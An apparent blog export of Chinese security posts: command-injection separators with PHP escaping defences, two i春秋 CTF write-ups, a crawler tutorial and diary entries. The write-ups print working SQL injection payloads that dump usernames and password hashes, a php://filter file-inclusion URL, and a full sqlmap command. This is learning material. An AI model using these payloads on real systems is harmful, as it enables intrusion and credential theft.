<code>Linux</code> 支持的管道符。</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li><p>|</p><p>  直接执行后面的语句。</p><blockquote><p>ping | whoami</p></blockquote></li><li><p>||</p><p>  如果前面的语句执行出错，则执行后面的语句。</p><blockquote><p>p || whoami</p></blockquote></li><li><p>\&amp;</p><p>  如果前面的语句为假，直接执行后面的语句。</p><p>  为真，也会执行后面的语句。</p><blockquote><p>ping 127.0.0.1 &amp; whoami</p></blockquote></li><li><p>\&amp;\&amp;</p><p>  如果前面的语句为假直接出错，不会执行后面的。前面的语句必须为真。</p><blockquote><p>ping 127.0.0.1 &amp;&amp; whoami</p></blockquote></li></ul><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li><p>\;</p><p>  执行完前面的语句，再执行后面的。</p><blockquote><p>ping 127.0.0.1;whoami</p></blockquote></li><li><p>|</p><p>  直接执行后面的语句。</p><blockquote><p>ping | whoami</p></blockquote></li><li><p>||</p><p>  如果前面的语句执行出错，则执行后面的语句。</p><blockquote><p>p || whoami</p></blockquote></li><li><p>\&amp;</p><p>  如果前面的语句为假，直接执行后面的语句。</p><p>  为真，也会执行后面的语句。</p><blockquote><p>ping 127.0.0.1 &amp; whoami</p></blockquote></li><li><p>\&amp;\&amp;</p><p>  如果前面的语句为假直接出错，不会执行后面的。前面的语句必须为真。</p><blockquote><p>ping 127.0.0.1 &amp;&amp; whoami</p></blockquote></li></ul><hr><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>PHP 内置了两个函数，<code>escapeshellarg()</code>，<code>escapeshellcmd()</code>可以防止命令执行。</p><ol><li><p>escapeshellarg()</p><p> 把字符串转码为可以在 shell 命令里使用的参数。</p></li><li><p>escapeshellcmd()</p><p> shell 元字符转义。</p><p> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <code>exec()</code> 或 <code>system()</code> 函数，或者 执行操作符 之前进行转义。</p><p> 反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>i春秋-Web-BLOG</title>
      <link href="/2018/09/11/ichunqiu-web-BLOG/"/>
      <url>/2018/09/11/ichunqiu-web-BLOG/</url>
      
        <content type="html"><![CDATA[<p>一个BLOG，注册后登录，发现使用了 <code>kindeditor 4.1.10</code> 编辑器，这个编辑器存在目录遍历漏洞，访问 <code>/kindeditor/php/file_manager_json.php?path=../</code>，会泄露目录内文件。</p><a id="more"></a><p><img src="/2018/09/11/ichunqiu-web-BLOG/kindeditor.png" alt="kindeditor"></p><p>发现 <code>flag</code> 就在网站根目录下，但是没办法访问到。</p><p>继续摸索，有个发文章的功能，存在SQL注入，INSERT型。</p><p>通过INSERT可以批量添加记录的特性，判断出当前表存在4个字段。</p><p>Payload:</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,’bbb’,’ccc’) # 报错<br>title=1&amp;content=1’,’1’),(‘aaa’,’bbb’,’ccc’,’ddd’) # 成功</p></blockquote><p>根据回显，得出第二个字段是标题，第三个字段是内容。</p><p>开始爆数据：</p><ul><li><p>爆表名</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(table_name) from information_schema.tables where table_schema = database()),’ccc’,’ddd’) # 得到表 [posts,users]</p></blockquote></li><li><p>爆字段</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select table_name, column_name from information_schema.columns where table_name = ‘users’ # 得到两个字段 [username,password]</p></blockquote></li><li><p>爆用户</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(username) from users ),’ccc’,’ddd’) # 得到用户名 admin </p></blockquote></li><li><p>爆密码</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(password) from users ),’ccc’,’ddd’) # 得到密码HASH dbb616c5d935d8f34c12c291066d6fb7，解密后 melody123</p></blockquote></li></ul><p>重新以 <code>admin</code> 身份登录，发现新的入口 <code>/blog_manage/manager.php?module=article_manage&amp;name=php</code>，看链接，长得就像文件包含漏洞。</p><p>测试后，发现确实是这个问题。</p><p>构造链接， <code>/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</code>，成功读到 <code>flag</code>。</p><p><img src="/2018/09/11/ichunqiu-web-BLOG/flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
            <tag> BLOG </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>i春秋-Web-SQLi</title>
      <link href="/2018/09/10/ichunqiu-web-SQLi/"/>
      <url>/2018/09/10/ichunqiu-web-SQLi/</url>
      
        <content type="html"><![CDATA[<p>一道注入题，登录页面。</p><p>试了常见的万能密码，无效，不存在弱口令。</p><p>使用BP，看下过滤了哪些字符。</p><a id="more"></a><p><img src="/2018/09/10/ichunqiu-web-SQLi/bp-1.png" alt="BP-1"></p><p>发现参数含有<code>%</code>时，报错。</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-1.png" alt="SQLi-1"></p><p>提示 <code>Warning: sprintf(): Too few arguments in /var/www/html/index.php on line 18</code>，根据提示，判定可能存在<code>sprintf格式化字符串漏洞</code>。</p><p>看下<code>sprintf</code>函数的描述。</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/info-1.png" alt="Info-1"></p><p>可以构造payload:<code>admin %1$&#39; or 1=1 #</code>，顶掉占位符，注入sql语句。此处，提示<code>password error!</code></p><p>此处不回显内容，但是有错误提示，只能盲注。</p><p>可以直接用<code>sqlmap</code>跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://b968f913d88e4ce5b916d5f6a2badf2e4568f7626bc84863.game.ichunqiu.com/&quot; --data &quot;username=admin%1$&apos; * #&amp;password=12345&quot; --no-cast -p username --level 3 -T B -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure><p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-2.png" alt="SQLi-2"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.colabug.com/4099484.html" target="_blank" rel="noopener">php中利用格式化字符串漏洞绕过addslashes注入</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>日常心路-180909</title>
      <link href="/2018/09/09/daily-life-20180909/"/>
      <url>/2018/09/09/daily-life-20180909/</url>
      
        <content type="html"><![CDATA[<p>最近忙了很多事，从公司离职，搬家，开学，又跑到某市做培训。</p><p>突然回到校园生活，身份从社会人变成学生，感觉还有点不适应。</p><p>今天，如愿以偿的通过了<code>Syclover</code>的面试，进入了新芽组，应该是唯一一个大三的新芽 ( ╯□╰ )，不过也算是完成了高中时候的心愿（进入CUIT，进入Syclover）。今天面的师傅很严肃，感觉自己确实还差的太多了，希望能在这个学期努力跟上。</p><p>这个学期，需要额外补<code>3</code>门课，把四级过了，还要尽量通过核心组面试，任务挺重的⊙﹏⊙∥。</p><p>诸君共勉吧(ﾉ*･ω･)ﾉ。</p><p><img src="/2018/09/09/daily-life-20180909/jldnydhgjxzpmdzj.jpg" alt="表情"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 心路 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬虫之批量下载Admin5源码</title>
      <link href="/2018/08/01/crawl-admin5/"/>
      <url>/2018/08/01/crawl-admin5/</url>
      
        <content type="html"><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p><a href="http://down.admin5.com" target="_blank" rel="noopener"><code>Admin5</code></a> 提供了各种语言的开源项目，包括<code>asp</code> <code>php</code> <code>.net</code> <code>jsp</code>等。最近开始玩代码审计，到处找项目很麻烦，所以打算写一个爬虫，借助Admin5批量下载各类开源项目。</p><a id="more"></a><h2 id="分析页面"><a href="#分析页面" class="headerlink" title="分析页面"></a>分析页面</h2><p>首先，分析下<code>Admin5</code>的页面。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-1.png" alt="截图-1"></p><p>可以看到，页面数据直接在html中显示的，并不是JS渲染上去的，这就比较好爬了。在响应的请求中，页面用的是<code>gb2312</code>编码，打印的时候需要注意一下，不然会乱码。建议设置编码为<code>gbk</code>，因为<code>gb2312</code>的支持的字没有<code>gbk</code>多，像打印<code>囧</code>的时候，就会抛异常。</p><p>首页的地址是<code>http://down.admin5.com/php/</code>，往后翻页，再看看首页的地址。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-2.png" alt="截图-2"></p><p>变成了<code>http://down.admin5.com/php/list_30_1.html</code>。</p><p>那么就可以得出页面的地址规则 <code>php/list_30_页码.html</code>。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-3.png" alt="截图-3"></p><p>这里使用<code>XPATH表达式</code>可以很方便的获取页面数据，<code>//div[@class=&quot;lists_bigimg_right&quot;]/a</code>，获取当前页所有项目详情的 <code>a</code> 标签，即详情页的地址。</p><p>随便进入一个项目的详情，找到下载地址。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-4.png" alt="截图-4"></p><p>使用 XPATH : <code>//ul[@class=&quot;down-anniu&quot;]//li/a/@href</code>，获取下载地址，这条XPATH是获取所有的下载点地址，实际用不到这么多，可以修改下 <code>//ul[@class=&quot;down-anniu&quot;]/li[1]/a/@href</code>，只获取1条。</p><p>当然，这个页面还包含了其它的数据，同样可以用 XPATH 采集，就不详细写了，后面在代码中会有。</p><h2 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h2><p>下面梳理下我们爬虫的运行流程。</p><ol><li><p>访问<code>http://down.admin5.com/php/</code>，<code>asp</code>,<code>.net</code>等语言项目的页面其实是一样的，改下路径就行，这里以<code>php</code>的为例。</p></li><li><p>获取后续页面的地址，即下一页。由于<code>Admin5</code>的页面比较简单，可以直接获取总页数，然后用<code>for</code>循环，遍历<code>http://down.admin5.com/php/list_30_页码.html</code>。</p></li><li><p>获取每个项目的详细页地址，并跟进。</p></li><li><p>提取项目的详细参数，获取下载地址，加入下载队列。</p></li><li><p>下载模块不断取出队列的任务，下载项目，直到队列为空。</p></li></ol><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>这个项目比较简单，所以没有用<code>scrapy</code>等很重的框架去做。就用最简单的<code>requests</code>库去实现，下面设计一下具体的业务模型。</p><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><ol><li>ProjectItem<ul><li>name</li><li>size</li><li>update_date</li><li>official_url</li><li>download_url</li></ul></li></ol><p>这个模型包含每个项目的属性，包括项目名称，大小，更新日期，官方地址，下载地址。</p><ol start="2"><li>Downloader<ul><li>download_queue</li><li>cache_path</li><li>save_path</li><li>add_task(projcet_item)</li><li>print_progress()</li><li>save_cache()</li></ul></li></ol><p>下载器，这个模型负责下载项目，维护下载队列，监控下载进度，并对下载过的项目地址做缓存，防止重复下载。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>已上传到 <a href="https://github.com/CHN-Jaylin/Spider/tree/master/admin5" target="_blank" rel="noopener">Github</a>， 具体实现请查看代码，注释已经写的比较清楚了。</p><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p><img src="/2018/08/01/crawl-admin5/screenshot-5.png" alt="截图-5"></p><p>已经实现了自动保存下载进度，可以随时<code>Ctrl+C</code>退出程序，下次执行时会跳过已下载的项目。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>昨天，明天</title>
      <link href="/2018/07/31/yesterday-and-tomorrow/"/>
      <url>/2018/07/31/yesterday-and-tomorrow/</url>
      
        <content type="html"><![CDATA[<p>在二零一八年七月的尾巴，写下这篇文章。算是对过去的一个回忆总结，还有未来的计划。</p><p>做安全，是我高中时候就有的想法。那个时候WooYun还在，我还记得曾经挖到一个小厂的任意用户密码重置的漏洞，注册了第一个账号，踏上了我在安全路上的第一步。</p><p>高中的时候住校，手机查的还严。每天最开心的就是窝在被子里，翻着WooYun，逛逛Zone。看看今天谁家Struts2的洞还没补，哪个厂的裤子又被脱了。当然，还有各路大佬分享的奇技淫巧，一哥猪猪侠，画漫画的小川……</p><p>大学，我来到离家1500KM的成都，因为各种原因，选了一个不喜欢的专业，加了学生会，每天都让自己很忙，常常是通宵在工作，也没有时间再去关注安全圈。第一个学期的学期末，重要的几门专业基础课还是都不懂。我意识到这个专业真的不适合我，即使毕业了，我也不会去做这行。某个晚上，我扯出路由器上的网线，连上学校内网，不小心拿到了支撑学校核心业务的数据库。表里，挂掉的两科静静的躺在那，思考了许久，还是关掉了终端…</p><p>第二个学期，不顾家人反对，我转到了软件专业，学习软件开发。环境原因，班上的计算机水平都不行，凭着高中攒下的知识，吊打大部分人。我开始参加各种比赛，移动开发，大数据，软件杯。一路过来，经历了很多，承担了很多，收获了很多，可以说是我人生成长最多的历程。在这里，我迷失过，特别是我深入开发之后，我发现IT的方向原来这么多，我对每个方向都感兴趣，但一个人不可能把每条路走通，必须找一条合适自己路。开发这条路，我走了很久，也做过自己引以为傲的作品。不过我不喜欢做业务，像是搬砖一样的堆砌代码，写没有灵魂的程序，所以，是时候回去了。</p><p>这一年，最开心的事莫过于通过升本考试，接下来的两年，我将在CUIT继续学习。CUIT最出名的，就是信息安全了吧，也是牛人云集的地方。希望多年以后，再看这篇文章的时候，我也是一枚大佬了。</p><p>不忘初心，方得始终。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 心路 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
